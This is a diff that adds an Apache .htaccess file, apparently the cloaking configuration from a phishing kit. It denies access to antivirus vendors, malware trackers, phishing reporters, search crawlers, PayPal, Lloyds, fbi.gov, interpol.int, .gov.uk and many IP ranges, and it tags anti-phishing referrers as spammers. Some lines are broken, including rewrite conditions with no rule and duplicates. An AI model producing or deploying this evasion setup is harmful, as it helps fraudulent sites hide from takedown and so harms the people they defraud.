@@ -1,0 +1,458 @@
+Options All -Indexes
+RewriteEngine on
+RewriteCond %{HTTP_REFERER} google\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} google\.com
+RewriteCond %{HTTP_REFERER} paypal\.com
+RewriteCond %{HTTP_REFERER} firefox\.com
+# Block Bad Bots & Scrapers
+SetEnvIfNoCase User-Agent "Aboundex" bad_bot
+SetEnvIfNoCase User-Agent "80legs" bad_bot
+SetEnvIfNoCase User-Agent "360Spider" bad_bot
+SetEnvIfNoCase User-Agent "http" bad_bot
+SetEnvIfNoCase User-Agent "^Java" bad_bot
+SetEnvIfNoCase User-Agent "^Cogentbot" bad_bot
+SetEnvIfNoCase User-Agent "^Alexibot" bad_bot
+SetEnvIfNoCase User-Agent "^asterias" bad_bot
+SetEnvIfNoCase User-Agent "^attach" bad_bot
+SetEnvIfNoCase User-Agent "^BackDoorBot" bad_bot
+SetEnvIfNoCase User-Agent "^BackWeb" bad_bot
+SetEnvIfNoCase User-Agent "Bandit" bad_bot
+SetEnvIfNoCase User-Agent "^BatchFTP" bad_bot
+SetEnvIfNoCase User-Agent "^Bigfoot" bad_bot
+SetEnvIfNoCase User-Agent "^Black.Hole" bad_bot
+SetEnvIfNoCase User-Agent "^BlackWidow" bad_bot
+SetEnvIfNoCase User-Agent "^BlowFish" bad_bot
+SetEnvIfNoCase User-Agent "^BotALot" bad_bot
+SetEnvIfNoCase User-Agent "Buddy" bad_bot
+SetEnvIfNoCase User-Agent "^BuiltBotTough" bad_bot
+SetEnvIfNoCase User-Agent "^Bullseye" bad_bot
+SetEnvIfNoCase User-Agent "^BunnySlippers" bad_bot
+SetEnvIfNoCase User-Agent "^Cegbfeieh" bad_bot
+SetEnvIfNoCase User-Agent "^CheeseBot" bad_bot
+SetEnvIfNoCase User-Agent "^CherryPicker" bad_bot
+SetEnvIfNoCase User-Agent "^ChinaClaw" bad_bot
+SetEnvIfNoCase User-Agent "Collector" bad_bot
+SetEnvIfNoCase User-Agent "Copier" bad_bot
+SetEnvIfNoCase User-Agent "^CopyRightCheck" bad_bot
+SetEnvIfNoCase User-Agent "^cosmos" bad_bot
+SetEnvIfNoCase User-Agent "^Crescent" bad_bot
+SetEnvIfNoCase User-Agent "^Custo" bad_bot
+SetEnvIfNoCase User-Agent "^AIBOT" bad_bot
+SetEnvIfNoCase User-Agent "^DISCo" bad_bot
+SetEnvIfNoCase User-Agent "^DIIbot" bad_bot
+SetEnvIfNoCase User-Agent "^DittoSpyder" bad_bot
+SetEnvIfNoCase User-Agent "^Download\ Demon" bad_bot
+SetEnvIfNoCase User-Agent "^Download\ Devil" bad_bot
+SetEnvIfNoCase User-Agent "^Download\ Wonder" bad_bot
+SetEnvIfNoCase User-Agent "^dragonfly" bad_bot
+SetEnvIfNoCase User-Agent "^Drip" bad_bot
+SetEnvIfNoCase User-Agent "^eCatch" bad_bot
+SetEnvIfNoCase User-Agent "^EasyDL" bad_bot
+SetEnvIfNoCase User-Agent "^ebingbong" bad_bot
+SetEnvIfNoCase User-Agent "^EirGrabber" bad_bot
+SetEnvIfNoCase User-Agent "^EmailCollector" bad_bot
+SetEnvIfNoCase User-Agent "^EmailSiphon" bad_bot
+SetEnvIfNoCase User-Agent "^EmailWolf" bad_bot
+SetEnvIfNoCase User-Agent "^EroCrawler" bad_bot
+SetEnvIfNoCase User-Agent "^Exabot" bad_bot
+SetEnvIfNoCase User-Agent "^Express\ WebPictures" bad_bot
+SetEnvIfNoCase User-Agent "Extractor" bad_bot
+SetEnvIfNoCase User-Agent "^EyeNetIE" bad_bot
+SetEnvIfNoCase User-Agent "^Foobot" bad_bot
+SetEnvIfNoCase User-Agent "^flunky" bad_bot
+SetEnvIfNoCase User-Agent "^FrontPage" bad_bot
+SetEnvIfNoCase User-Agent "^Go-Ahead-Got-It" bad_bot
+SetEnvIfNoCase User-Agent "^gotit" bad_bot
+SetEnvIfNoCase User-Agent "^GrabNet" bad_bot
+SetEnvIfNoCase User-Agent "^Grafula" bad_bot
+SetEnvIfNoCase User-Agent "^Harvest" bad_bot
+SetEnvIfNoCase User-Agent "^hloader" bad_bot
+SetEnvIfNoCase User-Agent "^HMView" bad_bot
+SetEnvIfNoCase User-Agent "^HTTrack" bad_bot
+SetEnvIfNoCase User-Agent "^humanlinks" bad_bot
+SetEnvIfNoCase User-Agent "^IlseBot" bad_bot
+SetEnvIfNoCase User-Agent "^Image\ Stripper" bad_bot
+SetEnvIfNoCase User-Agent "^Image\ Sucker" bad_bot
+SetEnvIfNoCase User-Agent "Indy\ Library" bad_bot
+SetEnvIfNoCase User-Agent "^InfoNaviRobot" bad_bot
+SetEnvIfNoCase User-Agent "^InfoTekies" bad_bot
+SetEnvIfNoCase User-Agent "^Intelliseek" bad_bot
+SetEnvIfNoCase User-Agent "^InterGET" bad_bot
+SetEnvIfNoCase User-Agent "^Internet\ Ninja" bad_bot
+SetEnvIfNoCase User-Agent "^Iria" bad_bot
+SetEnvIfNoCase User-Agent "^Jakarta" bad_bot
+SetEnvIfNoCase User-Agent "^JennyBot" bad_bot
+SetEnvIfNoCase User-Agent "^JetCar" bad_bot
+SetEnvIfNoCase User-Agent "^JOC" bad_bot
+SetEnvIfNoCase User-Agent "^JustView" bad_bot
+SetEnvIfNoCase User-Agent "^Jyxobot" bad_bot
+SetEnvIfNoCase User-Agent "^Kenjin.Spider" bad_bot
+SetEnvIfNoCase User-Agent "^Keyword.Density" bad_bot
+SetEnvIfNoCase User-Agent "^larbin" bad_bot
+SetEnvIfNoCase User-Agent "^LexiBot" bad_bot
+SetEnvIfNoCase User-Agent "^lftp" bad_bot
+SetEnvIfNoCase User-Agent "^libWeb/clsHTTP" bad_bot
+SetEnvIfNoCase User-Agent "^likse" bad_bot
+SetEnvIfNoCase User-Agent "^LinkextractorPro" bad_bot
+SetEnvIfNoCase User-Agent "^LinkScan/8.1a.Unix" bad_bot
+SetEnvIfNoCase User-Agent "^LNSpiderguy" bad_bot
+SetEnvIfNoCase User-Agent "^LinkWalker" bad_bot
+SetEnvIfNoCase User-Agent "^lwp-trivial" bad_bot
+SetEnvIfNoCase User-Agent "^LWP::Simple" bad_bot
+SetEnvIfNoCase User-Agent "^Magnet" bad_bot
+SetEnvIfNoCase User-Agent "^Mag-Net" bad_bot
+SetEnvIfNoCase User-Agent "^MarkWatch" bad_bot
+SetEnvIfNoCase User-Agent "^Mass\ Downloader" bad_bot
+SetEnvIfNoCase User-Agent "^Mata.Hari" bad_bot
+SetEnvIfNoCase User-Agent "^Memo" bad_bot
+SetEnvIfNoCase User-Agent "^Microsoft.URL" bad_bot
+SetEnvIfNoCase User-Agent "^Microsoft\ URL\ Control" bad_bot
+SetEnvIfNoCase User-Agent "^MIDown\ tool" bad_bot
+SetEnvIfNoCase User-Agent "^MIIxpc" bad_bot
+SetEnvIfNoCase User-Agent "^Mirror" bad_bot
+SetEnvIfNoCase User-Agent "^Missigua\ Locator" bad_bot
+SetEnvIfNoCase User-Agent "^Mister\ PiX" bad_bot
+SetEnvIfNoCase User-Agent "^moget" bad_bot
+SetEnvIfNoCase User-Agent "^Mozilla/3.Mozilla/2.01" bad_bot
+SetEnvIfNoCase User-Agent "^Mozilla.*NEWT" bad_bot
+SetEnvIfNoCase User-Agent "^NAMEPROTECT" bad_bot
+SetEnvIfNoCase User-Agent "^Navroad" bad_bot
+SetEnvIfNoCase User-Agent "^NearSite" bad_bot
+SetEnvIfNoCase User-Agent "^NetAnts" bad_bot
+SetEnvIfNoCase User-Agent "^Netcraft" bad_bot
+SetEnvIfNoCase User-Agent "^NetMechanic" bad_bot
+SetEnvIfNoCase User-Agent "^NetSpider" bad_bot
+SetEnvIfNoCase User-Agent "^Net\ Vampire" bad_bot
+SetEnvIfNoCase User-Agent "^NetZIP" bad_bot
+SetEnvIfNoCase User-Agent "^NextGenSearchBot" bad_bot
+SetEnvIfNoCase User-Agent "^NG" bad_bot
+SetEnvIfNoCase User-Agent "^NICErsPRO" bad_bot
+SetEnvIfNoCase User-Agent "^niki-bot" bad_bot
+SetEnvIfNoCase User-Agent "^NimbleCrawler" bad_bot
+SetEnvIfNoCase User-Agent "^Ninja" bad_bot
+SetEnvIfNoCase User-Agent "^NPbot" bad_bot
+SetEnvIfNoCase User-Agent "^Octopus" bad_bot
+SetEnvIfNoCase User-Agent "^Offline\ Explorer" bad_bot
+SetEnvIfNoCase User-Agent "^Offline\ Navigator" bad_bot
+SetEnvIfNoCase User-Agent "^Openfind" bad_bot
+SetEnvIfNoCase User-Agent "^OutfoxBot" bad_bot
+SetEnvIfNoCase User-Agent "^PageGrabber" bad_bot
+SetEnvIfNoCase User-Agent "^Papa\ Foto" bad_bot
+SetEnvIfNoCase User-Agent "^pavuk" bad_bot
+SetEnvIfNoCase User-Agent "^pcBrowser" bad_bot
+SetEnvIfNoCase User-Agent "^PHP\ version\ tracker" bad_bot
+SetEnvIfNoCase User-Agent "^Pockey" bad_bot
+SetEnvIfNoCase User-Agent "^ProPowerBot/2.14" bad_bot
+SetEnvIfNoCase User-Agent "^ProWebWalker" bad_bot
+SetEnvIfNoCase User-Agent "^psbot" bad_bot
+SetEnvIfNoCase User-Agent "^Pump" bad_bot
+SetEnvIfNoCase User-Agent "^QueryN.Metasearch" bad_bot
+SetEnvIfNoCase User-Agent "^RealDownload" bad_bot
+SetEnvIfNoCase User-Agent "Reaper" bad_bot
+SetEnvIfNoCase User-Agent "Recorder" bad_bot
+SetEnvIfNoCase User-Agent "^ReGet" bad_bot
+SetEnvIfNoCase User-Agent "^RepoMonkey" bad_bot
+SetEnvIfNoCase User-Agent "^RMA" bad_bot
+SetEnvIfNoCase User-Agent "Siphon" bad_bot
+SetEnvIfNoCase User-Agent "^SiteSnagger" bad_bot
+SetEnvIfNoCase User-Agent "^SlySearch" bad_bot
+SetEnvIfNoCase User-Agent "^SmartDownload" bad_bot
+SetEnvIfNoCase User-Agent "^Snake" bad_bot
+SetEnvIfNoCase User-Agent "^Snapbot" bad_bot
+SetEnvIfNoCase User-Agent "^Snoopy" bad_bot
+SetEnvIfNoCase User-Agent "^sogou" bad_bot
+SetEnvIfNoCase User-Agent "^SpaceBison" bad_bot
+SetEnvIfNoCase User-Agent "^SpankBot" bad_bot
+SetEnvIfNoCase User-Agent "^spanner" bad_bot
+SetEnvIfNoCase User-Agent "^Sqworm" bad_bot
+SetEnvIfNoCase User-Agent "Stripper" bad_bot
+SetEnvIfNoCase User-Agent "Sucker" bad_bot
+SetEnvIfNoCase User-Agent "^SuperBot" bad_bot
+SetEnvIfNoCase User-Agent "^SuperHTTP" bad_bot
+SetEnvIfNoCase User-Agent "^Surfbot" bad_bot
+SetEnvIfNoCase User-Agent "^suzuran" bad_bot
+SetEnvIfNoCase User-Agent "^Szukacz/1.4" bad_bot
+SetEnvIfNoCase User-Agent "^tAkeOut" bad_bot
+SetEnvIfNoCase User-Agent "^Teleport" bad_bot
+SetEnvIfNoCase User-Agent "^Telesoft" bad_bot
+SetEnvIfNoCase User-Agent "^TurnitinBot/1.5" bad_bot
+SetEnvIfNoCase User-Agent "^The.Intraformant" bad_bot
+SetEnvIfNoCase User-Agent "^TheNomad" bad_bot
+SetEnvIfNoCase User-Agent "^TightTwatBot" bad_bot
+SetEnvIfNoCase User-Agent "^Titan" bad_bot
+SetEnvIfNoCase User-Agent "^True_Robot" bad_bot
+SetEnvIfNoCase User-Agent "^turingos" bad_bot
+SetEnvIfNoCase User-Agent "^TurnitinBot" bad_bot
+SetEnvIfNoCase User-Agent "^URLy.Warning" bad_bot
+SetEnvIfNoCase User-Agent "^Vacuum" bad_bot
+SetEnvIfNoCase User-Agent "^VCI" bad_bot
+SetEnvIfNoCase User-Agent "^VoidEYE" bad_bot
+SetEnvIfNoCase User-Agent "^Web\ Image\ Collector" bad_bot
+SetEnvIfNoCase User-Agent "^Web\ Sucker" bad_bot
+SetEnvIfNoCase User-Agent "^WebAuto" bad_bot
+SetEnvIfNoCase User-Agent "^WebBandit" bad_bot
+SetEnvIfNoCase User-Agent "^Webclipping.com" bad_bot
+SetEnvIfNoCase User-Agent "^WebCopier" bad_bot
+SetEnvIfNoCase User-Agent "^WebEMailExtrac.*" bad_bot
+SetEnvIfNoCase User-Agent "^WebEnhancer" bad_bot
+SetEnvIfNoCase User-Agent "^WebFetch" bad_bot
+SetEnvIfNoCase User-Agent "^WebGo\ IS" bad_bot
+SetEnvIfNoCase User-Agent "^Web.Image.Collector" bad_bot
+SetEnvIfNoCase User-Agent "^WebLeacher" bad_bot
+SetEnvIfNoCase User-Agent "^WebmasterWorldForumBot" bad_bot
+SetEnvIfNoCase User-Agent "^WebReaper" bad_bot
+SetEnvIfNoCase User-Agent "^WebSauger" bad_bot
+SetEnvIfNoCase User-Agent "^Website\ eXtractor" bad_bot
+SetEnvIfNoCase User-Agent "^Website\ Quester" bad_bot
+SetEnvIfNoCase User-Agent "^Webster" bad_bot
+SetEnvIfNoCase User-Agent "^WebStripper" bad_bot
+SetEnvIfNoCase User-Agent "^WebWhacker" bad_bot
+SetEnvIfNoCase User-Agent "^WebZIP" bad_bot
+SetEnvIfNoCase User-Agent "Whacker" bad_bot
+SetEnvIfNoCase User-Agent "^Widow" bad_bot
+SetEnvIfNoCase User-Agent "^WISENutbot" bad_bot
+SetEnvIfNoCase User-Agent "^WWWOFFLE" bad_bot
+SetEnvIfNoCase User-Agent "^WWW-Collector-E" bad_bot
+SetEnvIfNoCase User-Agent "^Xaldon" bad_bot
+SetEnvIfNoCase User-Agent "^Xenu" bad_bot
+SetEnvIfNoCase User-Agent "^Zeus" bad_bot
+SetEnvIfNoCase User-Agent "^http" bad_bot
+SetEnvIfNoCase User-Agent "^google" bad_bot
+SetEnvIfNoCase User-Agent "^paypal" bad_bot
+SetEnvIfNoCase User-Agent "ZmEu" bad_bot
+SetEnvIfNoCase User-Agent "^paypal" bad_bot
+SetEnvIfNoCase User-Agent "^Zyborg" bad_bot
+SetEnvIfNoCase User-Agent "^bot" bad_bot
+SetEnvIfNoCase User-Agent "Acunetix" bad_bot
+SetEnvIfNoCase User-Agent "FHscan" bad_bot
+SetEnvIfNoCase User-Agent "Baiduspider" bad_bot
+SetEnvIfNoCase User-Agent "Yandex" bad_bot
+setenvifnocase Referer castlecops.com spammer=yes
+setenvifnocase Referer internetidentity.com spammer=yes
+setenvifnocase Referer phishfighting.com spammer=yes
+setenvifnocase Referer phishtank.com spammer=yes
+setenvifnocase Referer spamcop.net spammer=yes
+setenvifnocase Referer spam spammer=yes
+setenvifnocase Referer phish spammer=yes
+setenvifnocase Referer bezeqint.net spammer=yes
+deny from zeustracker.abuse.ch
+deny from virustotal.com
+deny from adminus.net
+deny from aegislab.com
+deny from alienvault.com
+deny from antiy.net
+deny from avast.com
+deny from team-cymru.org
+deny from eset.com
+deny from fireeye.com
+deny from microsoft.com
+deny from kernelmode.info
+deny from malwaredomainlist.com
+deny from wilderssecurity.com
+deny from eset-la.com
+deny from blogs.eset-la.com
+deny from welivesecurity.com
+deny from urlquery.net
+deny from anubis.iseclab.org
+deny from reclassify.url.trendmicro.com
+deny from dragonjar.org
+deny from vpro.su
+deny from cclub.su
+deny from securitybydefault.com
+deny from matthewfl.com
+deny from garyshood.com
+deny from virscan.org
+deny from malwarebytes.org
+deny from community.norton.com
+deny from avira.com
+deny from bitdefender.com
+deny from c-sirt.org
+deny from clean-mx.de
+deny from crdfglobal.org
+deny from comodo.com
+deny from fbi.gov
+deny from interpol.int
+deny from cybercitizenship.org
+deny from cybercrime-tracker.net
+deny from drweb.com
+deny from kaspersky.com
+deny from bitdefender.com
+deny from malwares.com
+deny from zvelo.com
+deny from zcloudsec.com
+deny from yandex.com
+deny from facebook.com
+deny from hotmail.com
+deny from google.com
+deny from wepawet.iseclab.org
+deny from websense.com
+deny from vxvault.siri-urz.net
+deny from tekdefense.com
+deny from malc0de.com
+deny from malwareblacklist.com
+deny from minotauranalysis.com
+deny from Sacour.cn
+deny from scoop.it
+deny from tencent.com
+deny from spyeyetracker.abuse.ch
+deny from abuse.ch
+deny from SCUMWARE.org
+deny from scumware.org
+deny from sophos.com
+deny from securebrain.co.jp
+deny from quttera.com
+deny from hosts-file.net
+deny from amada.abuse.ch
+deny from palevotracker.abuse.ch
+deny from blogger.com
+deny from phishtank.com
+deny from netcraft.com
+deny from google.com
+deny from yahoo.com
+deny from malwared.ru
+deny from malware.com.br
+deny from malekal.com
+deny from k7computing.com 
+deny from gdata.com
+deny from gdatasoftware.com
+deny from fortinet.com
+deny from emsisoft.com
+deny from quttera.com
+deny from opera.com
+deny from infospyware.com
+deny from kaspersky.com        
+Deny from 82.165.47.*
+Deny from 84.74.14
+Deny from *.abuse.ch
+<Limit GET POST>
+Order Allow,Deny
+Allow from all
+Deny from env=spammer
+Deny from google.com
+Deny from Google Chrome
+Deny from Chrome
+Deny from Kaspersky
+Deny from Avira
+Deny from yahoo.com
+Deny from search.com
+Deny from bing.com
+Deny from lloyds
+Deny from PayPal
+Deny from .co.uk
+Deny from .gov.uk
+Deny from bezeqint.net
+Deny from barak-online.net
+Deny from internetidentity.com
+Deny from phish-inspector.com
+Deny from netcraft.com
+Deny from spamcop.net
+Deny from veritas.com
+Deny from .edu
+Deny from crawl
+Deny from verisign-dbms.com
+Deny from verisign.com
+Deny from phishingsite-collector
+Deny from netcraft.com
+Deny from net.il
+Deny from com.il
+Deny from co.il
+Deny from org.il
+Deny from googlebot.com
+Deny from mcafee
+Deny from spam
+Deny from phish
+Deny from 66.249.71.179
+Deny from 124.176.210.234
+Deny from 125.18.56.109
+Deny from 128.232.110.18
+Deny from 137.108.145.10
+Deny from 137.110.222.77
+Deny from 138.26.64.54
+Deny from 202.73.
+Deny from 202.75.
+Deny from 209.147.
+Deny from 209.59.
+Deny from 64.127.
+Deny from 65.110.
+Deny from 66.135.
+Deny from 66.16.
+Deny from 66.179.
+Deny from 66.194.6.
+Deny from 80.178.
+Deny from 79.182.
+Deny from 87.69.
+Deny from 87.70.
+order allow,deny
+deny from 149.20.54.228
+deny from 66.166.75.114
+deny from 74.208.16.68
+deny from 74.125.183.23
+deny from 74.125.182.36
+deny from 149.20.54.136
+deny from 65.17.253.220
+deny from 69.163.205.29
+deny from 219.117.238.174
+deny from 69.20.70.31
+deny from 174.123.110.53
+deny from 91.199.104.3
+deny from 64.71.195.31
+deny from 66.65.156.74
+deny from 144.214.37.229
+deny from 84.14.214.213
+deny from 133.11.204.68
+deny from 125.14.226.143
+deny from 149.20.57.227
+deny from 149.20.54.227
+deny from 149.20.255.255
+deny from 149.20.255.255
+deny from 149.20.0.0
+deny from 66.77.136
+deny from 149.20.54.228
+deny from 66.166.75.114
+deny from 74.208.16.68
+deny from 149.20.54.136
+deny from 65.17.253.220
+deny from 69.163.205.29
+deny from 219.117.238.174
+deny from 69.20.70.31
+deny from 174.123.110.53
+deny from 91.199.104.3
+deny from 64.71.195.31
+deny from 66.65.156.74
+deny from 144.214.37.229
+deny from 84.14.214.213
+deny from 133.11.204.68
+deny from 125.14.226.143
+deny from 149.20.54.209
+deny from 149.20
+deny from 69.171
+deny from 209.85.224
+deny from 209.85.255
+deny from 209.85.128
+deny from 66.135
+deny from 174.122
+deny from 108.62
+deny from 66.150.14
+deny from 50.97
+deny from 209.235
+deny from 91.199.104
+deny from 115.160
+deny from 79.182
+deny from 210.247
+deny from 66.150
+deny from 66.249
+deny from 66.226
+deny from 66.227.16
+deny from 64.71
+deny from 66.211
+deny from 195.214
+deny from 84.110
+deny from 178.25
+deny from 74.125
+deny from 69.63.176.0/20
+deny from 69.63.189
+deny from 128.242.99.77
+deny from 81.218.48.5
+deny from 128.242.99.72
+Allow from all
+</Limit>
